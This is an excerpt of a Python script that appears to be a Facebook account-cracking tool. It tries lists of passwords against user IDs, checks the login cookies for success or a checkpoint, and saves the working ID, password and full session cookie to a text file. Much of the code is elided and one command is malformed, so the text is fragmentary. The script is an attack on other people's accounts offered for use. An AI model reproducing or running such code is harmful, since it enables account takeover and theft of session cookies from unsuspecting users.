...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-openhttps:https://www.facebook.com/profile.php?id=61555168673144')
        print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m START CRACK BD')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sIDFC\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;92m[IDFC-OK] {uid}|{ps}")
                open('/sdcard/BAYEZID/IDFC-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
  #           print(f"\x1b[38;5;191m[IDFC-OK] {uid}|{ps}")
                open('/sdcard/BAYEZID/IDFC-Ok.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
